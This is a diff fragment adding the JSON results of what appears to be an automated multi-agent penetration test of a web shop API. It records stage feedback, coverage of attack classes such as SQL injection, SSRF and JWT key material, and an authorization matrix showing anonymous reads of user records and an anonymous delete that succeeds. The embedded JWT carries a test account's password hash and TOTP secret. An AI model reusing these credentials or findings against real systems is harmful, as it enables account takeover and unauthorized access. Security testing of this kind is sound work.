+      "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NDAsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ3b3JrZXJfdXNlcl8xNzQ0ODU3NTY2QHRlc3QuY29tIiwicGFzc3dvcmQiOiJlY2M0MjA4YTc3NzhjMWQ3NmU3ZTg5YzUyNTMxMjhjNSIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiMjRPTExUQU41VzVCRUNGTTNJMlFaRkpVSjdJRENESjQiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNy0yNFQwMTo0NDozMi41NTNaIiwidXBkYXRlZEF0IjoiMjAyNi0wNy0yNFQwMTo0ODoxNC40OTJaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzg0ODU3NzIxfQ.Q5pq9rBLvgvRWPtQYZrROPVo2zUMrWxkw9j7kL2Kn76zvPcbnqZXgZlZ6Zqd397t07_3AjXCOiXIR3EWUe022lv2GeFOI9b0HGOuQYPFmsqPFbwiSZkWVpXJ8OqciS6GZ87hq8umpyPYLACt_LT_ULCVZX0ixPKa8BYylmavfuk"
+    }
+  },
+  "agent_graph": true,
+  "max_workers": 4,
+  "agent_packages": [
+    "class_probe/pentest-xss-dom",
+    "class_probe/pentest-api",
+    "class_probe/pentest-sql-injection",
+    "class_probe/pentest-authz-logic",
+    "class_probe/pentest-auth-session",
+    "class_probe/pentest-component-rce",
+    "class_probe/pentest-file-upload",
+    "class_probe/pentest-ssrf"
+  ],
+  "forced_packages": [
+    "pentest-sql-injection",
+    "pentest-ssrf",
+    "pentest-xss",
+    "pentest-component-rce"
+  ],
+  "effective_max_workers": 8,
+  "feedback": [
+    {
+      "loop": "evidence",
+      "stage": "surface",
+      "ok": true,
+      "detail": "ready=0"
+    },
+    {
+      "loop": "surface_ledger",
+      "stage": "surface",
+      "ok": true,
+      "detail": "surfaces=55 appish=40"
+    },
+    {
+      "loop": "surface_model",
+      "stage": "surface",
+      "ok": true,
+      "detail": "resources=32 actors=3"
+    },
+    {
+      "loop": "structure",
+      "stage": "surface",
+      "ok": true,
+      "detail": "json_ok"
+    },
+    {
+      "loop": "tool_use",
+      "stage": "surface",
+      "ok": true,
+      "detail": "calls=51"
+    },
+    {
+      "loop": "evidence",
+      "stage": "prior_reverify",
+      "ok": true,
+      "detail": "ready=0"
+    },
+    {
+      "loop": "discovery_yield",
+      "stage": "prior_reverify",
+      "ok": false,
+      "detail": "ready=0 tools=59 surfaces=55"
+    },
+    {
+      "loop": "structure",
+      "stage": "prior_reverify",
+      "ok": true,
+      "detail": "json_ok"
+    },
+    {
+      "loop": "tool_use",
+      "stage": "prior_reverify",
+      "ok": true,
+      "detail": "calls=59"
+    },
+    {
+      "loop": "retry",
+      "stage": "prior_reverify",
+      "ok": true,
+      "detail": "JSON/ledger/discovery retry: ['discovery_empty_ready']"
+    },
+    {
+      "loop": "evidence",
+      "stage": "prior_reverify",
+      "ok": true,
+      "detail": "ready=0"
+    },
+    {
+      "loop": "discovery_yield",
+      "stage": "prior_reverify",
+      "ok": true,
+      "detail": "ready=0 tools=70"
+    },
+    {
+      "loop": "structure",
+      "stage": "prior_reverify",
+      "ok": false,
+      "detail": "no parseable JSON"
+    },
+    {
+      "loop": "tool_use",
+      "stage": "prior_reverify",
+      "ok": true,
+      "detail": "calls=70"
+    },
+    {
+      "loop": "evidence",
+      "stage": "auth_session",
+      "ok": true,
+      "detail": "ready=0"
+    },
+    {
+      "loop": "discovery_yield",
+      "stage": "auth_session",
+      "ok": true,
+      "detail": "ready=0 tools=73"
+    },
+    {
+      "loop": "structure",
+      "stage": "auth_session",
+      "ok": false,
+      "detail": "no parseable JSON"
+    },
+    {
+      "loop": "tool_use",
+      "stage": "auth_session",
+      "ok": true,
+      "detail": "calls=73"
+    },
+    {
+      "loop": "retry",
+      "stage": "auth_session",
+      "ok": true,
+      "detail": "JSON/ledger/discovery retry: ['no parseable JSON']"
+    },
+    {
+      "loop": "evidence",
+      "stage": "auth_session",
+      "ok": true,
+      "detail": "ready=0"
+    },
+    {
+      "loop": "discovery_yield",
+      "stage": "auth_session",
+      "ok": true,
+      "detail": "ready=0 tools=47"
+    },
+    {
+      "loop": "structure",
+      "stage": "auth_session",
+      "ok": false,
+      "detail": "no parseable JSON"
+    },
+    {
+      "loop": "tool_use",
+      "stage": "auth_session",
+      "ok": true,
+      "detail": "calls=47"
+    },
+    {
+      "loop": "identity_chain",
+      "stage": "class_probe",
+      "ok": true,
+      "detail": "start id=totp-2fa reason=2fa_signal"
+    },
+    {
+      "loop": "identity_chain",
+      "stage": "class_probe",
+      "ok": true,
+      "detail": "pass=0 tools=56 new_cands=3 id=totp-2fa"
+    },
+    {
+      "loop": "evidence",
+      "stage": "class_probe",
+      "ok": true,
+      "detail": "ready=15"
+    },
+    {
+      "loop": "discovery_yield",
+      "stage": "class_probe",
+      "ok": true,
+      "detail": "new_cands=16 ready=15 structured_workers=7"
+    },
+    {
+      "loop": "injection_depth",
+      "stage": "class_probe",
+      "ok": true,
+      "detail": "sqli_cands=1 deep=1"
+    },
+    {
+      "loop": "coverage",
+      "stage": "class_probe",
+      "ok": true,
+      "detail": "deferred_to_coverage_probe untested=['graphql', 'upload', 'xss_self_inject', 'dom_client', 'websocket']"
+    },
+    {
+      "loop": "structure",
+      "stage": "class_probe",
+      "ok": true,
+      "detail": "json_ok"
+    },
+    {
+      "loop": "tool_use",
+      "stage": "class_probe",
+      "ok": true,
+      "detail": "calls=544"
+    },
+    {
+      "loop": "coverage",
+      "stage": "class_probe",
+      "ok": true,
+      "detail": "new_candidates=16"
+    },
+    {
+      "loop": "evidence",
+      "stage": "authz_logic",
+      "ok": true,
+      "detail": "ready=1"
+    },
+    {
+      "loop": "authz_coverage",
+      "stage": "authz_logic",
+      "ok": true,
+      "detail": "sens=29 authz_cands=1"
+    },
+    {
+      "loop": "structure",
+      "stage": "authz_logic",
+      "ok": false,
+      "detail": "no parseable JSON"
+    },
+    {
+      "loop": "tool_use",
+      "stage": "authz_logic",
+      "ok": true,
+      "detail": "calls=36"
+    },
+    {
+      "loop": "retry",
+      "stage": "authz_logic",
+      "ok": true,
+      "detail": "JSON/ledger/discovery retry: ['no parseable JSON']"
+    },
+    {
+      "loop": "evidence",
+      "stage": "authz_logic",
+      "ok": true,
+      "detail": "ready=1"
+    },
+    {
+      "loop": "authz_coverage",
+      "stage": "authz_logic",
+      "ok": true,
+      "detail": "sens=29 authz_cands=1"
+    },
+    {
+      "loop": "structure",
+      "stage": "authz_logic",
+      "ok": false,
+      "detail": "no parseable JSON"
+    },
+    {
+      "loop": "tool_use",
+      "stage": "authz_logic",
+      "ok": true,
+      "detail": "calls=18"
+    },
+    {
+      "loop": "authz_soft_skip",
+      "stage": "authz_logic",
+      "ok": true,
+      "detail": "no dual-actor structured result"
+    },
+    {
+      "loop": "evidence",
+      "stage": "component",
+      "ok": true,
+      "detail": "ready=2"
+    },
+    {
+      "loop": "structure",
+      "stage": "component",
+      "ok": true,
+      "detail": "json_ok"
+    },
+    {
+      "loop": "tool_use",
+      "stage": "component",
+      "ok": true,
+      "detail": "calls=55"
+    },
+    {
+      "loop": "dedupe",
+      "stage": "validate_book",
+      "ok": true,
+      "detail": "suppressed_duplicate_candidates=2 unique=22"
+    },
+    {
+      "loop": "evidence",
+      "stage": "validate_book",
+      "ok": true,
+      "detail": "booked=15 skipped_weak_or_incomplete_or_surface=7"
+    },
+    {
+      "loop": "evidence_quality",
+      "stage": "validate_book",
+      "ok": true,
+      "detail": "quality_fail=3 prior_defer=0 booked=15"
+    },
+    {
+      "loop": "coverage",
+      "stage": "finalize",
+      "ok": false,
+      "detail": "untested=['graphql', 'upload', 'xss_self_inject', 'dom_client', 'websocket'] attempt_rate=0.643"
+    },
+    {
+      "loop": "discovery_yield",
+      "stage": "finalize",
+      "ok": false,
+      "detail": "structure_fail_n=5 discovery_soft_fail_n=1 stages=['prior_reverify'] ready_by_stage={'surface': 0, 'prior_reverify': 0, 'auth_session': 0, 'class_probe': 15, 'authz_logic': 1, 'component': 2}"
+    }
+  ],
+  "last_stage_tool_calls": 55,
+  "last_stage_structured": true,
+  "coverage_ledger": [
+    {
+      "id": "authz_matrix",
+      "outcome": "attempted",
+      "detail": "matrix_start",
+      "paths": []
+    },
+    {
+      "id": "authz_matrix",
+      "outcome": "closed",
+      "detail": "matrix differential booked Authz matrix HTTP proof: anon GET /api/Users → 200 (sensitive collection); cross-actor GET both 200 on id=1 path=/api/Users; anon DELETE /api/Feedbacks/1 id=1 → 200; cross-actor GET both 200 on id=1 path=/api/Feedbacks; write_tried=True; cells_sample=[{\"resource\": \"/api/Users\", \"actor\": \"anon\", \"method\": \"GET\", \"status\": 200, \"id\": null}, {\"resource\": \"/api/Users\", \"actor\": \"actor_a\", \"method\": \"G",
+      "paths": []
+    }
+  ],
+  "coverage_metrics": {
+    "coverage_required": [
+      "injection_search",
+      "ssrf_url_sink",
+      "jwt_key_material",
+      "graphql",
+      "identity_reset",
+      "identity_change_password",
+      "identity_2fa",
+      "authz_matrix",
+      "sensitive_tech_exposure",
+      "upload",
+      "xss_self_inject",
+      "dom_client",
+      "business_logic",
+      "websocket"
+    ],
+    "coverage_attempted": [
+      "injection_search",
+      "ssrf_url_sink",
+      "jwt_key_material",
+      "identity_reset",
+      "identity_change_password",
+      "identity_2fa",
+      "authz_matrix",
+      "sensitive_tech_exposure",
+      "business_logic"
+    ],
+    "coverage_closed": [
+      "injection_search",
+      "ssrf_url_sink",
+      "jwt_key_material",
+      "identity_reset",
+      "identity_change_password",
+      "identity_2fa",
+      "authz_matrix",
+      "sensitive_tech_exposure",
+      "business_logic"
+    ],
+    "coverage_failed": [],
+    "coverage_blocked": [],
+    "coverage_untested": [
+      "graphql",
+      "upload",
+      "xss_self_inject",
+      "dom_client",
+      "websocket"
+    ],
+    "coverage_required_n": 14,
+    "coverage_attempted_n": 9,
+    "coverage_closed_n": 9,
+    "coverage_blocked_n": 0,
+    "coverage_attempt_rate": 0.643,
+    "coverage_close_rate": 1.0,
+    "coverage_statuses": {
+      "injection_search": "closed",
+      "ssrf_url_sink": "closed",
+      "jwt_key_material": "closed",
+      "graphql": "untested",
+      "identity_reset": "closed",
+      "identity_change_password": "closed",
+      "identity_2fa": "closed",
+      "authz_matrix": "closed",
+      "sensitive_tech_exposure": "closed",
+      "upload": "untested",
+      "xss_self_inject": "untested",
+      "dom_client": "untested",
+      "business_logic": "closed",
+      "websocket": "untested"
+    },
+    "forced_packages": [
+      "pentest-sql-injection",
+      "pentest-ssrf",
+      "pentest-xss",
+      "pentest-component-rce"
+    ],
+    "effective_max_workers": 8,
+    "authz_matrix_cells": 23,
+    "hv_campaigns_opened": 14,
+    "hv_campaigns_attempted": 9,
+    "hv_campaigns_booked": 9,
+    "hv_attempt_rate": 0.643,
+    "hv_success_rate": 1.0,
+    "hv_recon_hits": [
+      "encryptionkeys",
+      "image_url",
+      "search",
+      "logs",
+      "graphql"
+    ],
+    "hv_recon_hit_count": 5
+  },
+  "hv_metrics": {
+    "coverage_required": [
+      "injection_search",
+      "ssrf_url_sink",
+      "jwt_key_material",
+      "graphql",
+      "identity_reset",
+      "identity_change_password",
+      "identity_2fa",
+      "authz_matrix",
+      "sensitive_tech_exposure",
+      "upload",
+      "xss_self_inject",
+      "dom_client",
+      "business_logic",
+      "websocket"
+    ],
+    "coverage_attempted": [
+      "injection_search",
+      "ssrf_url_sink",
+      "jwt_key_material",
+      "identity_reset",
+      "identity_change_password",
+      "identity_2fa",
+      "authz_matrix",
+      "sensitive_tech_exposure",
+      "business_logic"
+    ],
+    "coverage_closed": [
+      "injection_search",
+      "ssrf_url_sink",
+      "jwt_key_material",
+      "identity_reset",
+      "identity_change_password",
+      "identity_2fa",
+      "authz_matrix",
+      "sensitive_tech_exposure",
+      "business_logic"
+    ],
+    "coverage_failed": [],
+    "coverage_blocked": [],
+    "coverage_untested": [
+      "graphql",
+      "upload",
+      "xss_self_inject",
+      "dom_client",
+      "websocket"
+    ],
+    "coverage_required_n": 14,
+    "coverage_attempted_n": 9,
+    "coverage_closed_n": 9,
+    "coverage_blocked_n": 0,
+    "coverage_attempt_rate": 0.643,
+    "coverage_close_rate": 1.0,
+    "coverage_statuses": {
+      "injection_search": "closed",
+      "ssrf_url_sink": "closed",
+      "jwt_key_material": "closed",
+      "graphql": "untested",
+      "identity_reset": "closed",
+      "identity_change_password": "closed",
+      "identity_2fa": "closed",
+      "authz_matrix": "closed",
+      "sensitive_tech_exposure": "closed",
+      "upload": "untested",
+      "xss_self_inject": "untested",
+      "dom_client": "untested",
+      "business_logic": "closed",
+      "websocket": "untested"
+    },
+    "forced_packages": [
+      "pentest-sql-injection",
+      "pentest-ssrf",
+      "pentest-xss",
+      "pentest-component-rce"
+    ],
+    "effective_max_workers": 8,
+    "authz_matrix_cells": 23,
+    "hv_campaigns_opened": 14,
+    "hv_campaigns_attempted": 9,
+    "hv_campaigns_booked": 9,
+    "hv_attempt_rate": 0.643,
+    "hv_success_rate": 1.0,
+    "hv_recon_hits": [
+      "encryptionkeys",
+      "image_url",
+      "search",
+      "logs",
+      "graphql"
+    ],
+    "hv_recon_hit_count": 5
+  },
+  "authz_matrix": [
+    {
+      "resource": "/api/Users",
+      "actor": "anon",
+      "method": "GET",
+      "status": 200,
+      "id": null
+    },
+    {
+      "resource": "/api/Users",
+      "actor": "actor_a",
+      "method": "GET",
+      "status": 200,
+      "id": null
+    },
+    {
+      "resource": "/api/Users",
+      "actor": "actor_b",
+      "method": "GET",
+      "status": 200,
+      "id": null
+    },
+    {
+      "resource": "/api/Users/1",
+      "actor": "anon",
+      "method": "GET",
+      "status": 200,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Users/1",
+      "actor": "actor_a",
+      "method": "GET",
+      "status": 200,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Users/1",
+      "actor": "actor_b",
+      "method": "GET",
+      "status": 200,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Users/1",
+      "actor": "anon",
+      "method": "PUT",
+      "status": 401,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Users/1",
+      "actor": "anon",
+      "method": "DELETE",
+      "status": 401,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Users/1",
+      "actor": "actor_b",
+      "method": "PUT",
+      "status": 401,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Users/1",
+      "actor": "actor_b",
+      "method": "DELETE",
+      "status": 401,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Users/{id}",
+      "actor": "anon",
+      "method": "GET",
+      "status": 404,
+      "id": null
+    },
+    {
+      "resource": "/api/Users/{id}",
+      "actor": "actor_a",
+      "method": "GET",
+      "status": 404,
+      "id": null
+    },
+    {
+      "resource": "/api/Users/{id}",
+      "actor": "actor_b",
+      "method": "GET",
+      "status": 404,
+      "id": null
+    },
+    {
+      "resource": "/api/Feedbacks",
+      "actor": "anon",
+      "method": "GET",
+      "status": 200,
+      "id": null
+    },
+    {
+      "resource": "/api/Feedbacks",
+      "actor": "actor_a",
+      "method": "GET",
+      "status": 200,
+      "id": null
+    },
+    {
+      "resource": "/api/Feedbacks",
+      "actor": "actor_b",
+      "method": "GET",
+      "status": 200,
+      "id": null
+    },
+    {
+      "resource": "/api/Feedbacks/1",
+      "actor": "anon",
+      "method": "GET",
+      "status": 200,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Feedbacks/1",
+      "actor": "actor_a",
+      "method": "GET",
+      "status": 200,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Feedbacks/1",
+      "actor": "actor_b",
+      "method": "GET",
+      "status": 200,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Feedbacks/1",
+      "actor": "anon",
+      "method": "PUT",
+      "status": 401,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Feedbacks/1",
+      "actor": "anon",
+      "method": "DELETE",
+      "status": 200,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Feedbacks/1",
+      "actor": "actor_b",
+      "method": "PUT",
+      "status": 401,
+      "id": "1"
+    },
+    {
+      "resource": "/api/Feedbacks/1",
+      "actor": "actor_b",
+      "method": "DELETE",
+      "status": 404,
+      "id": "1"
+    }
+  ]
+}
